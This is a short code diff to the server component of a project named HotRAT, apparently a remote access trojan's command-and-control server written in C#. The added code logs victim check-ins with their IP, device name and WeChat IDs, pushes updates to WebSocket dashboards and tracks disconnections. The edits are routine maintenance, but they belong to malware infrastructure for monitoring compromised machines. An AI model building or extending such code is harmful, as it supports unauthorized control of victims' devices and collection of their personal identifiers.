@@ -1,4 +1,5 @@
-﻿using Newtonsoft.Json;
+﻿using HotRAT.WSServer.Models;
+using Newtonsoft.Json;
 using System;
 using System.Collections.Concurrent;
 using System.IO;
@@ -117,6 +118,9 @@ namespace HotRAT.Server.Models
                     Info.WXID = reader.ReadString().Split("|");
                     LoggerModel.AddToLog($"[{Info.IP}:{Info.Port}][{Info.DeviceName}]上线包已接收", InfoLevel.Normal);
                     Console.WriteLine(JsonConvert.SerializeObject(Info,Formatting.Indented));
+
+                    //通知所有ws
+                    WebSocketServer.UpdataAllClients();
                     break;
                 case 0x02:
                     var datas = Encoding.UTF8.GetString(data).Split("\\n");
@@ -150,9 +154,27 @@ namespace HotRAT.Server.Models
 
         public void Dispose()
         {
-            _stream?.Dispose();
-            TcpClient?.Dispose();
-            _packetBuffer?.Dispose();
+            try
+            {
+                foreach (var client in Runtimes._clients)
+                {
+                    if(client.Key == ConnectionId)
+                    {
+                        Runtimes._clients.TryRemove(ConnectionId,out _);
+                    }
+                }
+                _stream?.Dispose();
+                TcpClient?.Dispose();
+                _packetBuffer?.Dispose();
+
+                Runtimes.CWrite($"[{Info.IP}:{Info.Port}][{ConnectionId}] 下线", ConsoleColor.Red);
+
+                WebSocketServer.UpdataAllClients();
+            }
+            catch (Exception ex)
+            {
+                Runtimes.CWrite($"Dispose 错误: {ex.Message}", ConsoleColor.Red);
+            }
         }
     }
 
